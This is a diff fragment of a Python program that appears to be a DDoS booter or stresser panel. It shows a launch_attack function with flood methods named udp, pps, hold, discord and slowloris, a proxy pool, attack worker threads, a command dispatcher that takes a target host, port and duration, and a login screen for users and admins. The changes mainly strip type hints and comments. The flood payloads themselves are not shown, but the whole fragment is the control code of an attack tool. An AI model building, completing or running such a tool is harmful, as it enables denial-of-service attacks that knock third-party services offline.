-def launch_attack(method: str, host: str, port: int, duration: int, extra: List[str]):
+def launch_attack(method, host, port, duration, extra):
     local_methods = ("udp", "pps", "hold", "discord", "slowloris")
     if not S.proxies and method not in local_methods:
         S.current_view = "log"
@@ -1549,22 +1338,15 @@ def launch_attack(method: str, host: str, port: int, duration: int, extra: List[
         "pool_size": len(S.proxies), "dead": 0, "started": time.time(),
     }
     S.attack_frame = 0
-    S.attack_thread = threading.Thread(
-        target=attack_worker, args=(method, host, port, duration), daemon=True,
-    )
+    S.attack_thread = threading.Thread(target=attack_worker, args=(method, host, port, duration), daemon=True)
     S.attack_thread.start()
 
-# ============================================================
-#  SECTION 20 — DISPATCH
-# ============================================================
-
-def dispatch(line: str):
+def dispatch(line):
     line = line.strip()
     if not line: return
     S.log_line(f"{S.username}●death► {line}")
     parts = line.split()
     cmd, args = parts[0].lower(), parts[1:]
-
     method_names = {m[0] for _, items in METHODS for m in items}
     if cmd in method_names:
         if len(args) < 3:
@@ -1576,25 +1358,19 @@ def dispatch(line: str):
             S.current_view = "log"; S.log_line("port and time must be integers"); return
         launch_attack(cmd, host, port, duration, args[3:])
         return
-
     handler = COMMAND_TABLE.get(cmd)
     if handler is None:
         S.current_view = "log"; S.log_line(f"unknown command: {cmd}  (try 'help')"); return
     handler(args)
 
-# ============================================================
-#  SECTION 21 — CROSS-PLATFORM INPUT
-# ============================================================
-
-_key_queue: "queue.Queue[str]" = queue.Queue()
+_key_queue = queue.Queue()
 
 def _stdin_reader():
     while True:
         try:
             ch = sys.stdin.read(1)
             if not ch:
-                time.sleep(0.05)
-                continue
+                time.sleep(0.05); continue
             _key_queue.put(ch)
         except Exception:
             time.sleep(0.1)
@@ -1602,32 +1378,24 @@ def _stdin_reader():
 _reader_thread = threading.Thread(target=_stdin_reader, daemon=True)
 _reader_thread.start()
 
-def read_key() -> Optional[str]:
+def read_key():
     try:
         return _key_queue.get_nowait()
     except queue.Empty:
         return None
 
-def handle_key(ch: str):
+def handle_key(ch):
     if ch is None: return
     if ch in ("S", "s") and S.scraping and not S.input_buffer:
         S.scrape_stop.set(); S.log_line("S pressed — stopping scrape, saving what we have..."); return
-    if ch == "\x03":
-        S.running = False; return
+    if ch == "\x03": S.running = False; return
     if ch in ("\r", "\n"):
         line = S.input_buffer; S.input_buffer = ""; dispatch(line); return
-    if ch in ("\x7f", "\b"):
-        S.input_buffer = S.input_buffer[:-1]; return
-    if ch == "\x1b":
-        return
-    if ch.isprintable():
-        S.input_buffer += ch
+    if ch in ("\x7f", "\b"): S.input_buffer = S.input_buffer[:-1]; return
+    if ch == "\x1b": return
+    if ch.isprintable(): S.input_buffer += ch
 
-# ============================================================
-#  SECTION 22 — LOGIN
-# ============================================================
-
-def login_screen() -> bool:
+def login_screen():
     theme = S.theme
     sys.stdout.write(CLEAR)
     sys.stdout.write(render_banner(0))
@@ -1655,7 +1423,6 @@ def login_screen() -> bool:
 
     sys.stdout.write("\n" + center(solid("password: ", theme, "dim")))
     sys.stdout.flush()
-
     password = ""
     while True:
         ch = read_key()
@@ -1673,15 +1440,10 @@ def login_screen() -> bool:
     ok, is_admin = verify_user(username, password)
     if ok:
         S.username = username; S.is_admin = is_admin; return True
-
     sys.stdout.write("\n\n" + center(solid("access denied", theme, "accent")) + "\n")
     sys.stdout.flush()
     time.sleep(1.5)
     return login_screen()
-
-# ============================================================
-#  SECTION 23 — MAIN LOOP
-# ============================================================
 
 def main():
     if not login_screen(): return
@@ -1689,21 +1451,18 @@ def main():
     sys.stdout.write(HIDE_CURSOR + CLEAR)
     sys.stdout.flush()
     last_size = term_size()
-
     try:
         while S.running:
             ch = read_key()
             while ch is not None:
                 handle_key(ch); ch = read_key()
-
             cur_size = term_size()
             if cur_size != last_size:
                 sys.stdout.write(CLEAR); sys.stdout.flush()
                 last_size = cur_size
-
             if S.attack_screen is not None:
-                buf = [render_attack_screen(S.attack_frame)]
-                sys.stdout.write("".join(buf)); sys.stdout.flush()
+                sys.stdout.write(render_attack_screen(S.attack_frame))
+                sys.stdout.flush()
                 if S.attack_screen.get("remaining", 0) <= 0 and (
                     S.attack_thread is None or not S.attack_thread.is_alive()
                 ):
@@ -1711,10 +1470,9 @@ def main():
                 S.attack_frame += 1
                 time.sleep(1 / 24)
                 continue
-
             frame = S.frame
-            buf = [HOME, CLEAR, render_banner(frame), render_body(frame), render_prompt(frame)]
-            sys.stdout.write("".join(buf)); sys.stdout.flush()
+            sys.stdout.write(HOME + CLEAR + render_banner(frame) + render_body(frame) + render_prompt(frame))
+            sys.stdout.flush()
             S.frame += 1
             time.sleep(1 / 30)
     except KeyboardInterrupt:
